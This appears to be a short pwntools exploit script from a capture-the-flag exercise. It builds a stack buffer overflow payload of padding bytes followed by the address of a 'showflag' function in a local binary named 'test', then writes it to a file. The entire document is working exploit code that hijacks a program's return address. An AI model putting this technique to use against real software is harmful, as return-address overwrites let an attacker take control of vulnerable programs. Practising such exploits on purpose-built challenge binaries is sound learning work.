from pwn import *
test = ELF('./test')
payload = 'a' * 0x100 + 'b' * 8 + p64(test.symbols['showflag'])
open('big', 'w').write(payload)
